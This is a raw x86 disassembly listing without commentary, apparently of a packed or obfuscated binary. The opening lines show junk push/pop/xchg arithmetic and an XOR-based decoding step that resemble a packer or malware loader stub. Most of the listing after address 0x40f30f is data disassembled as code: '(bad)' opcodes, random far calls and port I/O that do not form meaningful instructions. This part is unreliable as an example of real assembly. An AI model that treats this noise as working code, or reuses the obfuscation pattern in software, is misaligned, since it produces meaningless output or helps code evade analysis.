  40f283:	mov    DWORD PTR [ebp-0x18],0x0
  40f28a:	push   edx
  40f28b:	pop    eax
  40f28c:	push   0x5
  40f28e:	sub    edx,eax
  40f290:	pop    edx
  40f291:	add    edx,0xa
  40f294:	push   edx
  40f295:	pop    ecx
  40f296:	push   0xa
  40f298:	dec    ecx
  40f299:	pop    ebx
  40f29a:	dec    ebx
  40f29b:	xchg   ebx,ecx
  40f29d:	sub    ebx,ecx
  40f29f:	xchg   ebx,ecx
  40f2a1:	dec    ecx
  40f2a2:	mov    eax,DWORD PTR [ebp-0x14]
  40f2a5:	imul   eax,ecx
  40f2a8:	sub    esp,eax
  40f2aa:	mov    DWORD PTR [ebp-0x18],esp
  40f2ad:	mov    eax,DWORD PTR [ebp-0x38]
  40f2b0:	mov    ecx,DWORD PTR [ebp-0x34]
  40f2b3:	xor    eax,esi
  40f2b5:	add    eax,edi
  40f2b7:	jmp    0x40f2fe
  40f2bc:	mov    ebx,DWORD PTR [ebp-0x40]
  40f2bf:	mov    ecx,DWORD PTR [ebp-0x3c]
  40f2c2:	mov    eax,DWORD PTR [ebp+0x8]
  40f2c5:	mov    ecx,DWORD PTR [ebp+0x14]
  40f2c8:	mov    eax,DWORD PTR [ecx+eax*4+0x4]
  40f2cc:	xor    ebx,esi
  40f2ce:	xor    edx,edx
  40f2d0:	add    ebx,edi
  40f2d2:	div    ebx
  40f2d4:	mov    ecx,DWORD PTR [ebp-0x38]
  40f2d7:	mov    edx,DWORD PTR [ebp-0x34]
  40f2da:	xor    ecx,esi
  40f2dc:	lea    eax,[ecx+eax*1+0x56424137]
  40f2e3:	mov    ecx,DWORD PTR [ebp+0x8]
  40f2e6:	mov    edx,DWORD PTR [ebp-0x18]
  40f2e9:	mov    DWORD PTR [edx+ecx*4],eax
  40f2ec:	mov    eax,DWORD PTR [ebp-0x40]
  40f2ef:	mov    ecx,DWORD PTR [ebp-0x3c]
  40f2f2:	mov    ecx,DWORD PTR [ebp+0x8]
  40f2f5:	xor    eax,esi
  40f2f7:	lea    eax,[eax+ecx*1+0x56424137]
  40f2fe:	mov    DWORD PTR [ebp+0x8],eax
  40f301:	mov    eax,DWORD PTR [ebp-0x40]
  40f304:	mov    ecx,DWORD PTR [ebp-0x3c]
  40f307:	mov    ecx,DWORD PTR [ebp+0x14]
  40f30a:	jmp    0x4116a0
  40f30f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f310:	daa    
  40f311:	arpl   WORD PTR [eax+0x62],dx
  40f314:	push   esp
  40f315:	mov    ah,0x75
  40f317:	adc    bl,BYTE PTR [eax+eax*1]
  40f31a:	cmp    eax,eax
  40f31c:	and    BYTE PTR [ebp-0x5a],ch
  40f31f:	jae    0x40f369
  40f321:	jnp    0x40f39e
  40f323:	repnz cwde 
  40f325:	jnp    0x40f3a2
  40f327:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f328:	nop
  40f329:	inc    ebp
  40f32a:	fidivr DWORD PTR [eax-0x68d43206]
  40f330:	fwait
  40f331:	jl     0x40f2dd
  40f333:	div    BYTE PTR [eiz*1+0x71b2489b]
  40f33a:	call   0x5fef:0xb7ac7af2
  40f341:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f342:	pop    esi
  40f343:	dec    ebp
  40f344:	inc    esp
  40f345:	mov    al,0x7b
  40f347:	in     eax,dx
  40f348:	adc    DWORD PTR [esi],esp
  40f34a:	mov    dl,0xe4
  40f34c:	sub    eax,0x7be63f54
  40f351:	adc    al,0x52
  40f353:	mov    DWORD PTR [edi],ebp
  40f355:	lods   eax,DWORD PTR ds:[esi]
  40f356:	ud0    edi,edi
  40f359:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f35a:	ror    edx,cl
  40f35c:	and    al,BYTE PTR [ebp+0x64ba1a62]
  40f362:	test   al,0x90
  40f364:	sbb    al,0x34
  40f366:	push   edx
  40f367:	dec    ecx
  40f368:	aad    0x3b
  40f36a:	in     al,dx
  40f36b:	or     BYTE PTR [esi],dh
  40f36d:	neg    BYTE PTR ds:0x26f9353f
  40f373:	xchg   edi,eax
  40f374:	jo     0x40f302
  40f376:	sbb    BYTE PTR [edx-0x7e],0xd2
  40f37a:	test   al,0x72
  40f37c:	ds lock push ebx
  40f37f:	mov    ds:0x6898edae,eax
  40f384:	sbb    edx,edi
  40f386:	cld    
  40f387:	iret   
  40f388:	inc    ecx
  40f389:	and    esp,eax
  40f38b:	and    al,0xb5
  40f38d:	push   ss
  40f38e:	push   ebx
  40f38f:	cmp    BYTE PTR [edx],0x6
  40f392:	jo     0x40f3b0
  40f394:	ss stos BYTE PTR es:[edi],al
  40f396:	pusha  
  40f397:	inc    eax
  40f398:	icebp  
  40f399:	dec    esi
  40f39a:	lea    ebp,[esi-0x29df3da4]
  40f3a0:	push   esp
  40f3a1:	(bad)  
  40f3a2:	adc    al,0xaf
  40f3a4:	mov    esi,0x6219b4ca
  40f3a9:	xor    eax,0x8c57e7ba
  40f3ae:	mov    eax,0x1322a835
  40f3b3:	stc    
  40f3b4:	ds hlt 
  40f3b6:	je     0x40f3ee
  40f3b8:	fst    st(2)
  40f3ba:	pop    es
  40f3bb:	std    
  40f3bc:	jmp    0xa436193a
  40f3c1:	lods   al,BYTE PTR ds:[esi]
  40f3c2:	imul   eax,DWORD PTR [esi-0xfaac10],0x4121a37a
  40f3cc:	sahf   
  40f3cd:	jp     0x40f44a
  40f3cf:	ffreep st(2)
  40f3d1:	and    ecx,ebp
  40f3d3:	clc    
  40f3d4:	jmp    0x598f58dc
  40f3d9:	jl     0x40f37f
  40f3db:	ror    BYTE PTR [ebp-0x50e802d0],1
  40f3e1:	xchg   edi,eax
  40f3e2:	pop    es
  40f3e3:	push   0x36
  40f3e5:	cld    
  40f3e6:	rcr    DWORD PTR [ebp-0x3aa91c71],cl
  40f3ec:	ds ds in al,dx
  40f3ef:	into   
  40f3f0:	add    eax,0x88e7ca92
  40f3f5:	sub    al,0xf1
  40f3f7:	pop    eax
  40f3f8:	iret   
  40f3f9:	loope  0x40f42e
  40f3fb:	xchg   esi,eax
  40f3fc:	shr    edx,cl
  40f3fe:	lods   eax,DWORD PTR ds:[esi]
  40f3ff:	xor    al,0x1c
  40f401:	dec    ebx
  40f402:	mov    bh,0xe5
  40f404:	cwde   
  40f405:	lock das 
  40f407:	push   cs
  40f408:	fnstsw WORD PTR [edx-0x41]
  40f40b:	les    ecx,FWORD PTR [eax]
  40f40d:	daa    
  40f40e:	sub    ecx,DWORD PTR [ebx]
  40f410:	jg     0x40f3c5
  40f412:	pop    esp
  40f413:	add    dl,cl
  40f415:	ds pop eax
  40f417:	mov    dh,BYTE PTR [esi+0x40]
  40f41a:	ficomp DWORD PTR ds:0xa01a0659
  40f420:	mov    ebx,0xfbd98315
  40f425:	add    ah,0xe9
  40f428:	imul   BYTE PTR [edx+edx*4]
  40f42b:	ss loopne 0x40f46d
  40f42e:	xorps  xmm5,XMMWORD PTR [eax]
  40f431:	inc    edi
  40f432:	jl     0x40f418
  40f434:	popa   
  40f435:	sbb    dh,BYTE PTR [ebp+0x2c]
  40f438:	push   0x73e81563
  40f43d:	xor    dh,bl
  40f43f:	mov    edi,0xdb17534d
  40f444:	cmp    DWORD PTR cs:[ecx+0x4d6e8b2c],esp
  40f44b:	mov    eax,ds:0x937bf9d
  40f450:	jg     0x40f467
  40f452:	xor    ebx,DWORD PTR [edx-0x7d]
  40f455:	in     eax,dx
  40f456:	aam    0xf4
  40f458:	or     DWORD PTR [esi],ebp
  40f45a:	xor    BYTE PTR [ecx-0xb387a2e],bh
  40f460:	pop    edx
  40f461:	jecxz  0x40f492
  40f463:	bound  edi,QWORD PTR [ebp-0x4a487d71]
  40f469:	jae    0x40f489
  40f46b:	outs   dx,DWORD PTR ds:[esi]
  40f46c:	mov    eax,ds:0xb75a5161
  40f471:	lods   al,BYTE PTR ds:[esi]
  40f472:	(bad)  
  40f473:	jl     0x40f4d9
  40f475:	jae    0x40f433
  40f477:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f478:	xchg   esi,eax
  40f479:	stos   DWORD PTR es:[edi],eax
  40f47a:	ja     0x40f413
  40f47c:	ror    BYTE PTR [eax],cl
  40f47e:	sbb    al,0x6c
  40f480:	add    al,0xff
  40f482:	xor    DWORD PTR [ebx],ecx
  40f484:	inc    ebp
  40f485:	mov    edi,0xe0c67b7c
  40f48a:	int    0xa2
  40f48c:	fidivr WORD PTR [edi-0x11]
  40f48f:	push   0xffffffaf
  40f491:	sub    al,0x8f
  40f493:	xchg   BYTE PTR [esi+0x2f807637],dh
  40f499:	mov    bl,0x36
  40f49b:	mov    ecx,0x7c869ff4
  40f4a0:	or     eax,0xca16a45b
  40f4a5:	push   ds
  40f4a6:	scas   eax,DWORD PTR es:[edi]
  40f4a7:	iret   
  40f4a8:	imul   ebp,DWORD PTR [ebx],0xfffffff3
  40f4ab:	stos   BYTE PTR es:[edi],al
  40f4ac:	push   ds
  40f4ad:	bound  esp,QWORD PTR [esi]
  40f4af:	mov    ecx,0x99b59d5
  40f4b4:	push   ss
  40f4b5:	cmp    eax,0xc390c90e
  40f4ba:	test   DWORD PTR [eax*2+0x33aa9707],edx
  40f4c1:	js     0x40f44b
  40f4c3:	mov    edi,0x53b1a1b2
  40f4c8:	cmp    eax,edi
  40f4ca:	push   0xffffffba
  40f4cc:	jae    0x40f4ca
  40f4ce:	cli    
  40f4cf:	call   0xe4da:0x1eaa7d7f
  40f4d6:	(bad)  [esi+0xdd34c7]
  40f4dc:	aam    0x75
  40f4de:	sbb    ch,BYTE PTR [eax+0x77]
  40f4e1:	or     eax,DWORD PTR [edx+0x4e]
  40f4e4:	adc    DWORD PTR [ecx+0x3c],ebp
  40f4e7:	lds    ebx,FWORD PTR [eax+0x27]
  40f4ea:	gs in  al,dx
  40f4ec:	adc    ebp,DWORD PTR [edx]
  40f4ee:	xchg   ebx,eax
  40f4ef:	jg     0x40f483
  40f4f1:	cmp    bh,dl
  40f4f3:	scas   eax,DWORD PTR es:[edi]
  40f4f4:	ret    
  40f4f5:	xchg   ebp,eax
  40f4f6:	(bad)  
  40f4f7:	jbe    0x40f510
  40f4f9:	cmp    ebx,0x7a
  40f4fc:	call   0x823e:0x8fd3f671
  40f503:	test   eax,0xd81edcff
  40f508:	fld    QWORD PTR [eax]
  40f50a:	or     esp,esp
  40f50c:	or     eax,0x7b66f5fc
  40f511:	cmp    al,0x44
  40f513:	hlt    
  40f514:	fiadd  DWORD PTR [eax-0x2e4fe772]
  40f51a:	ins    BYTE PTR es:[edi],dx
  40f51b:	adc    eax,0xadadeaa6
  40f520:	std    
  40f521:	jbe    0x40f4fc
  40f523:	pop    edi
  40f524:	mov    ah,0xdd
  40f526:	ds icebp 
  40f528:	push   eax
  40f529:	jno    0x40f511
  40f52b:	into   
  40f52c:	mov    edx,0x6a318495
  40f531:	lahf   
  40f532:	dec    edx
  40f533:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f534:	dec    ebp
  40f535:	mov    cl,0x28
  40f537:	sub    ebp,DWORD PTR [esi-0x51]
  40f53a:	mov    eax,0x902e54eb
  40f53f:	aam    0x23
  40f541:	sbb    bl,BYTE PTR [eax-0x42a3a530]
  40f547:	add    DWORD PTR [edi-0x3d],esp
  40f54a:	jb     0x40f533
  40f54c:	and    al,0xc1
  40f54e:	(bad)  
  40f54f:	fcmovbe st,st(2)
  40f551:	push   esi
  40f552:	out    dx,eax
  40f553:	mov    ebx,0x6ab1b3bc
  40f558:	test   al,0x2f
  40f55a:	stos   DWORD PTR es:[edi],eax
  40f55b:	cmp    DWORD PTR [ebp+0x7d],ebp
  40f55e:	enter  0xf6bd,0xab
  40f562:	jb     0x40f533
  40f564:	mov    WORD PTR [edi+0x498781a6],?
  40f56a:	and    bl,BYTE PTR [edx+0x47]
  40f56d:	jo     0x40f59a
  40f56f:	xchg   BYTE PTR ds:0x4fb3b609,dl
  40f575:	aad    0x69
  40f577:	jp     0x40f57d
  40f579:	sub    DWORD PTR [ebx+0x28],ecx
  40f57c:	sbb    al,0xbf
  40f57e:	popf   
  40f57f:	and    eax,edx
  40f581:	push   ss
  40f582:	outs   dx,BYTE PTR ds:[esi]
  40f583:	xchg   edx,eax
  40f584:	xchg   ecx,eax
  40f585:	pushf  
  40f586:	add    esi,edx
  40f588:	cmp    DWORD PTR [edi-0x43cc7664],0x1a
  40f58f:	stos   BYTE PTR es:[edi],al
  40f590:	jno    0x40f5f1
  40f592:	lea    ebx,[edi+0x3afaef3f]
  40f598:	pop    ds
  40f599:	fchs   
  40f59b:	mov    DWORD PTR [edx+0x77],esi
  40f59e:	(bad)  
  40f5a0:	inc    ecx
  40f5a1:	fist   WORD PTR [edi+0x6d]
  40f5a4:	adc    dl,BYTE PTR [eax]
  40f5a6:	or     BYTE PTR [ebx-0x2f],dh
  40f5a9:	inc    ebp
  40f5aa:	pop    ss
  40f5ab:	inc    esi
  40f5ac:	sub    edi,esp
  40f5ae:	mov    eax,ds:0x28c6f7ee
  40f5b3:	add    eax,DWORD PTR [edi+0x6d980822]
  40f5b9:	and    BYTE PTR [esi],bl
  40f5bb:	xchg   ebp,eax
  40f5bc:	xor    al,0x16
  40f5be:	ret    
  40f5bf:	lock xchg edi,eax
  40f5c1:	dec    ecx
  40f5c2:	aam    0x1a
  40f5c4:	inc    ebx
  40f5c5:	jne    0x40f62d
  40f5c7:	(bad)  
  40f5c8:	cld    
  40f5c9:	jb     0x40f584
  40f5cb:	icebp  
  40f5cc:	cmp    BYTE PTR [ebp+0x12],bl
  40f5cf:	out    0x35,al
  40f5d1:	mov    ch,0x89
  40f5d3:	push   ds
  40f5d4:	popf   
  40f5d5:	lods   eax,DWORD PTR ds:[esi]
  40f5d6:	ret    
  40f5d7:	pop    ebp
  40f5d8:	xor    edx,ecx
  40f5da:	aas    
  40f5db:	test   al,0x59
  40f5dd:	stc    
  40f5de:	or     dh,cl
  40f5e0:	mov    ch,0x7d
  40f5e2:	xchg   DWORD PTR [edx+eax*1+0xc],edi
  40f5e6:	xor    eax,0x60413cbf
  40f5eb:	mov    ds:0x78a1b2b3,eax
  40f5f0:	inc    esp
  40f5f1:	cmp    dl,ch
  40f5f3:	push   ebx
  40f5f4:	imul   BYTE PTR [edi+0x2f]
  40f5f7:	test   BYTE PTR [ebp+0x55],dl
  40f5fa:	sti    
  40f5fb:	add    cl,0xe1
  40f5fe:	sbb    BYTE PTR [esi+0x3bd23b23],dh
  40f604:	cmp    BYTE PTR [esi],dl
  40f606:	mov    al,0x7a
  40f608:	and    DWORD PTR [edx],esi
  40f60a:	cld    
  40f60b:	xor    al,0x60
  40f60d:	sbb    bh,bl
  40f60f:	jmp    0x40f5f3
  40f611:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f612:	push   edx
  40f613:	and    al,0x4d
  40f615:	mov    ah,BYTE PTR [ecx]
  40f617:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f618:	sub    DWORD PTR [ebx-0x72],eax
  40f61b:	mov    dl,0x8a
  40f61d:	sub    ecx,esp
  40f61f:	sub    al,0x14
  40f621:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f622:	pop    ecx
  40f623:	inc    esp
  40f624:	or     bl,al
  40f626:	fsubrp st(5),st
  40f628:	cs push eax
  40f62a:	add    DWORD PTR [ebx+0x27e44a41],eax
  40f630:	xchg   edi,eax
  40f631:	adc    al,0x35
  40f633:	lahf   
  40f634:	mov    ss,WORD PTR [edx]
  40f636:	loope  0x40f63d
  40f638:	ret    
  40f639:	sub    ch,ah
  40f63b:	xor    eax,0xe107b3d4
  40f640:	scas   al,BYTE PTR es:[edi]
  40f641:	fst    DWORD PTR [ebp+0x69cbcefe]
  40f647:	mov    ds:0x80eaa15,al
  40f64c:	push   esp
  40f64d:	clc    
  40f64e:	mov    DWORD PTR [ecx+0x1c],edi
  40f651:	xlat   BYTE PTR ds:[ebx]
  40f652:	xor    DWORD PTR ds:0x491f561f,ecx
  40f658:	outs   dx,BYTE PTR ds:[esi]
  40f659:	jl     0x40f691
  40f65b:	sub    eax,0x61983d14
  40f660:	cmp    bh,ch
  40f662:	adc    ecx,DWORD PTR [edi+0x44]
  40f665:	push   ecx
  40f666:	into   
  40f667:	mov    cl,0x68
  40f669:	adc    al,0x1d
  40f66b:	jo     0x40f6ca
  40f66d:	or     eax,0x4d3a66d9
  40f672:	stc    
  40f673:	pop    eax
  40f674:	mov    BYTE PTR [ecx+0x65],ch
  40f677:	lods   eax,DWORD PTR ds:[esi]
  40f678:	popf   
  40f679:	lahf   
  40f67a:	adc    bh,ah
  40f67c:	fldenv [edx+0x29]
  40f67f:	imul   ebp,DWORD PTR [edx-0x5542605c],0x1c
  40f686:	retf   0x5656
  40f689:	addr16 ds push ds
  40f68c:	fstp   DWORD PTR [eax+0x57]
  40f68f:	dec    ebp
  40f690:	add    ah,bl
  40f692:	xlat   BYTE PTR ds:[ebx]
  40f693:	dec    ecx
  40f694:	fdiv   DWORD PTR ds:0x447e333e
  40f69a:	sub    ecx,esi
  40f69c:	out    dx,al
  40f69d:	mov    WORD PTR [esi],cs
  40f69f:	out    dx,eax
  40f6a0:	add    edx,DWORD PTR [eax]
  40f6a2:	xchg   esp,eax
  40f6a3:	pop    edx
  40f6a4:	mov    ah,0x4
  40f6a6:	fwait
  40f6a7:	clc    
  40f6a8:	sbb    DWORD PTR [edx],edi
  40f6aa:	test   DWORD PTR [ecx-0x13c1a953],eax
  40f6b0:	lds    ebx,FWORD PTR [ebp-0x75955243]
  40f6b6:	mov    edi,0x9ab65d71
  40f6bb:	mov    ecx,DWORD PTR [edx+0x32]
  40f6be:	and    ecx,DWORD PTR [esi+0x67ea2232]
  40f6c4:	add    BYTE PTR [edi+0x76],0xf6
  40f6c8:	jns    0x40f6f6
  40f6ca:	addr16 ret 0x3a42
  40f6ce:	aam    0xce
  40f6d0:	out    0xe0,al
  40f6d2:	cmp    al,0xd1
  40f6d4:	jp     0x40f6d1
  40f6d6:	fs fst st(4)
  40f6d9:	sub    edi,DWORD PTR [ecx-0x74]
  40f6dc:	arpl   WORD PTR [edx],cx
  40f6de:	push   edx
  40f6df:	aam    0x31
  40f6e1:	inc    edx
  40f6e2:	popa   
  40f6e3:	in     eax,dx
  40f6e4:	sbb    eax,0x168154ac
  40f6e9:	xor    DWORD PTR [eax],esi
  40f6eb:	repz call 0xf335:0xf17bb11c
  40f6f3:	jg     0x40f75b
  40f6f5:	outs   dx,BYTE PTR ds:[esi]
  40f6f6:	in     eax,dx
  40f6f7:	shl    BYTE PTR [eax+0x61],0x94
  40f6fb:	enter  0x68b7,0x34
  40f6ff:	adc    eax,0x8837950
  40f704:	aad    0xfa
  40f706:	pop    es
  40f707:	clc    
  40f708:	fabs   
  40f70a:	jae    0x40f713
  40f70c:	xor    DWORD PTR [edi-0x59],edx
  40f70f:	sbb    al,BYTE PTR [edi+0x6d]
  40f712:	xchg   edi,eax
  40f713:	jge    0x40f747
  40f715:	jge    0x40f755
  40f717:	retf   0xb507
  40f71a:	inc    esp
  40f71b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f71c:	dec    eax
  40f71d:	push   edx
  40f71e:	mov    al,0x53
  40f720:	imul   ecx,DWORD PTR [eax+0x3c],0xffffff9d
  40f724:	sub    al,0xdd
  40f726:	popf   
  40f727:	loop   0x40f6fe
  40f729:	adc    eax,0xbb024654
  40f72e:	addr16 push edi
  40f730:	inc    edx
  40f731:	add    esi,DWORD PTR [ebx+0x46]
  40f734:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f735:	jl     0x40f7a0
  40f737:	add    ebp,DWORD PTR [edx-0x69]
  40f73a:	mov    dh,0xc
  40f73c:	cmp    DWORD PTR [esi],edi
  40f73e:	mov    ecx,0x234b68b4
  40f743:	and    edi,DWORD PTR [edi+eiz*1]
  40f746:	mov    fs,WORD PTR [ebp+0x7119201d]
  40f74c:	jl     0x40f6e9
  40f74e:	ja     0x40f6fb
  40f750:	data16 mov WORD PTR [esp+eax*2+0x31],es
  40f755:	mov    ebx,0xeca3c1e5
  40f75a:	push   edi
  40f75b:	mov    DWORD PTR [ecx+0x1ff56a05],ecx
  40f761:	(bad)  [edi+0x2b]
  40f764:	xor    esp,0x49
  40f767:	imul   esi,DWORD PTR [ebx],0xffffffe3
  40f76a:	in     al,dx
  40f76b:	inc    ebx
  40f76c:	pop    ecx
  40f76d:	fstp   TBYTE PTR [ecx-0x73]
  40f770:	adc    al,0x64
  40f772:	mov    WORD PTR [ebp+0x36],cs
  40f775:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f776:	mov    ecx,0x888b5fa8
  40f77b:	inc    esi
  40f77c:	popa   
  40f77d:	test   al,0x6b
  40f77f:	shl    DWORD PTR [eax-0xc],1
  40f782:	xchg   ecx,eax
  40f783:	imul   esp,DWORD PTR [ebx-0x3a10a9f0],0x65
  40f78a:	mov    ah,0xeb
  40f78c:	xchg   edi,eax
  40f78d:	shl    ch,cl
  40f78f:	push   0xffffffc6
  40f791:	cmp    esi,DWORD PTR [ebx]
  40f793:	rcr    DWORD PTR [edi+edx*4],cl
  40f796:	out    0xa8,al
  40f798:	mov    esp,0xe5a22cf
  40f79d:	jnp    0x40f815
  40f79f:	(bad)  
  40f7a0:	cmc    
  40f7a1:	sahf   
  40f7a2:	les    ebx,FWORD PTR [eax+0x1f]
  40f7a5:	cld    
  40f7a6:	addr16 or dh,cl
  40f7a9:	dec    edi
  40f7aa:	pusha  
  40f7ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7ac:	xchg   DWORD PTR [ebx+edx*8-0x77],ebx
  40f7b0:	dec    DWORD PTR [ebx+0x1e]
  40f7b3:	mov    al,0xc2
  40f7b5:	inc    edi
  40f7b6:	shr    DWORD PTR [edx-0x7d7c2475],0xee
  40f7bd:	fstp   DWORD PTR [ebx+ebx*1-0x6]
  40f7c1:	add    al,0xde
  40f7c3:	shld   DWORD PTR [esi-0x77],eax,cl
  40f7c7:	cmc    
  40f7c8:	aas    
  40f7c9:	ficomp WORD PTR [ebx+0x26]
  40f7cc:	mov    edx,0x359c301a
  40f7d1:	cmp    eax,ebp
  40f7d3:	push   ecx
  40f7d4:	fisttp WORD PTR [ecx-0x79]
  40f7d7:	xor    bh,ah
  40f7d9:	retf   
  40f7da:	fst    QWORD PTR [ebx-0x5e]
  40f7dd:	jle    0x40f7f1
  40f7df:	mov    bl,0x93
  40f7e1:	data16 out 0x7d,al
  40f7e4:	push   ecx
  40f7e5:	mov    ecx,DWORD PTR [ecx]
  40f7e7:	cmp    eax,0xa28aaef0
  40f7ec:	xchg   esi,eax
  40f7ed:	test   edx,0xc10a1bc1
  40f7f3:	pop    ds
  40f7f4:	sub    DWORD PTR [ebp+0x65ce4515],ebp
  40f7fa:	fld    TBYTE PTR [ebp-0x42]
  40f7fd:	cld    
  40f7fe:	xchg   BYTE PTR [esi+0x1337e4f7],dh
  40f804:	jo     0x40f869
  40f806:	out    dx,eax
  40f807:	cli    
  40f808:	rol    BYTE PTR [ebx+0x2f],cl
  40f80b:	xchg   ebp,eax
  40f80c:	popf   
  40f80d:	xchg   edx,eax
  40f80e:	cmp    al,0x76
  40f810:	test   eax,0x52b0148d
  40f815:	mov    esi,0x986697b
  40f81a:	xchg   esp,eax
  40f81b:	cwde   
  40f81c:	jns    0x40f852
  40f81e:	sbb    DWORD PTR [esi-0x4c],eax
  40f821:	fild   DWORD PTR [ebp+0x77]
  40f824:	mov    DWORD PTR [esi-0x2110bc05],edi
  40f82a:	pop    ss
  40f82b:	cmp    eax,0x4e3cb859
  40f830:	jo     0x40f7cf
  40f832:	loop   0x40f82d
  40f834:	and    eax,0x18728f11
  40f839:	mov    dl,0xee
  40f83b:	jb     0x40f7d2
  40f83d:	call   0x319:0xb5d0e727
  40f844:	mov    cl,0x4b
  40f846:	or     BYTE PTR [ecx-0x24],al
  40f849:	add    esi,esi
  40f84b:	inc    eax
  40f84c:	inc    eax
  40f84d:	mov    bl,0xb9
  40f84f:	adc    BYTE PTR [esi],dh
  40f851:	cmp    BYTE PTR [eax],bl
  40f853:	shl    BYTE PTR [ebx],0xf9
  40f856:	adc    DWORD PTR [edi],ecx
  40f858:	nop
  40f859:	push   ebp
  40f85a:	xor    eax,0x1674ea30
  40f85f:	or     al,0x1c
  40f861:	jo     0x40f8a9
  40f863:	popf   
  40f864:	mov    ebp,0xe59a07fe
  40f869:	add    eax,0x1b1e0ca1
  40f86e:	add    al,BYTE PTR [edi-0x4e]
  40f871:	or     DWORD PTR [eax-0x3b],0xda245ea9
  40f878:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f879:	clc    
  40f87a:	shr    DWORD PTR [esi],0xfe
  40f87d:	enter  0x37ee,0xa8
  40f881:	and    ecx,DWORD PTR [edi-0x6a18d7fc]
  40f887:	mov    esi,0x1a3c73f3
  40f88c:	push   ds
  40f88d:	(bad)  
  40f88e:	repz mov esp,0x6b6efb06
  40f894:	xor    DWORD PTR [eax+edi*4],edi
  40f897:	pusha  
  40f898:	nop
  40f899:	jecxz  0x40f81e
  40f89b:	and    bh,BYTE PTR [esi+ecx*4-0x1e0f7848]
  40f8a2:	jno    0x40f835
  40f8a4:	mov    eax,ds:0xebf10ae2
  40f8a9:	pop    ss
  40f8aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8ab:	mov    dl,0x86
  40f8ad:	pop    esp
  40f8ae:	dec    ebp
  40f8af:	and    bh,BYTE PTR [ebx-0x4f]
  40f8b2:	pop    ds
  40f8b3:	mov    ecx,0xd2d4137e
  40f8b8:	adc    ebx,ebx
  40f8ba:	bound  esi,QWORD PTR [esi+0x2c]
  40f8bd:	bound  edi,QWORD PTR [ebx-0xd6e46c9]
  40f8c3:	push   edi
  40f8c4:	ror    DWORD PTR [ebp+0x64],0xa5
  40f8c8:	out    dx,eax
  40f8c9:	cmp    DWORD PTR [edx+ebx*8+0x4d8397c1],ebx
  40f8d0:	(bad)  
  40f8d1:	mov    esp,0x35004f80
  40f8d6:	cld    
  40f8d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8d8:	rol    cl,1
  40f8da:	mov    fs,WORD PTR [ecx]
  40f8dc:	test   DWORD PTR [eax],edx
  40f8de:	mov    bh,BYTE PTR [ebp-0x6c066eab]
  40f8e4:	out    0x6a,al
  40f8e6:	test   al,0xf0
  40f8e8:	sti    
  40f8e9:	hlt    
  40f8ea:	ins    BYTE PTR es:[edi],dx
  40f8eb:	jg     0x40f87a
  40f8ed:	lods   al,BYTE PTR ds:[esi]
  40f8ee:	stc    
  40f8ef:	mov    ebx,0xae58edf8
  40f8f4:	pop    ds
  40f8f5:	adc    DWORD PTR [edx+ebx*4+0xdbdfcc9],eax
  40f8fc:	je     0x40f913
  40f8fe:	fwait
  40f8ff:	aad    0x8e
  40f901:	mov    ds:0xb5df4f46,eax
  40f906:	cmp    eax,DWORD PTR [esi]
  40f908:	mov    bh,0x14
  40f90a:	pop    ecx
  40f90b:	xchg   esp,eax
  40f90c:	pop    esi
  40f90d:	push   edi
  40f90e:	and    ch,ah
  40f910:	xchg   dl,al
  40f912:	rcl    DWORD PTR [eax+0x6b],0xaa
  40f916:	mov    ebp,ss
  40f918:	lea    ebx,[ebx]
  40f91a:	sbb    eax,0x4d0ef826
  40f91f:	lahf   
  40f920:	aam    0x2
  40f922:	jge    0x40f927
  40f924:	push   ebp
  40f925:	ins    DWORD PTR es:[edi],dx
  40f926:	push   edx
  40f927:	pop    edi
  40f928:	adc    BYTE PTR [edi+0x21],al
  40f92b:	sbb    DWORD PTR [edi+ecx*1-0x396bb01f],0xbce91c87
  40f936:	dec    esi
  40f937:	jae    0x40f987
  40f939:	(bad)  
  40f93a:	shl    DWORD PTR [edx+0x49],1
  40f93d:	movntq QWORD PTR [esi-0x1c],mm2
  40f941:	inc    esi
  40f942:	pop    ecx
  40f943:	ins    DWORD PTR es:[edi],dx
  40f944:	xor    eax,0xa0576b38
  40f949:	stos   BYTE PTR es:[edi],al
  40f94a:	xor    BYTE PTR [edx],al
  40f94c:	div    BYTE PTR [edi]
  40f94e:	scas   eax,DWORD PTR es:[edi]
  40f94f:	cmp    eax,0xff87430b
  40f954:	add    ebp,DWORD PTR [ecx+0x3fc923a8]
  40f95a:	add    BYTE PTR [ebx-0x34],dh
  40f95d:	pop    esi
  40f95e:	(bad)  
  40f960:	xchg   edx,eax
  40f961:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f962:	adc    dl,BYTE PTR [esi+0x5590f60a]
  40f968:	out    dx,eax
  40f969:	mov    esi,0xfdc0c272
  40f96e:	cmp    BYTE PTR [eax-0x28669839],bh
  40f974:	xchg   edx,eax
  40f975:	adc    al,BYTE PTR [esi+0x777af8eb]
  40f97b:	push   ds
  40f97c:	mov    ds:0xd74d04e3,al
  40f981:	push   ds
  40f982:	adc    al,0x8c
  40f984:	mov    bh,0x4
  40f986:	add    eax,0x57baedeb
  40f98b:	fucomi st,st(3)
  40f98d:	mov    ch,0x13
  40f98f:	ins    BYTE PTR es:[edi],dx
  40f990:	dec    ebp
  40f991:	arpl   cx,ax
  40f993:	into   
  40f994:	adc    al,0x4f
  40f996:	loope  0x40f92f
  40f998:	loop   0x40f91e
  40f99a:	push   0x7
  40f99c:	push   cs
  40f99d:	rcr    DWORD PTR [ecx],cl
  40f99f:	pop    eax
  40f9a0:	xchg   ebp,eax
  40f9a1:	inc    esi
  40f9a2:	sub    eax,0x2fc31856
  40f9a7:	xor    DWORD PTR [ebx-0x79],edx
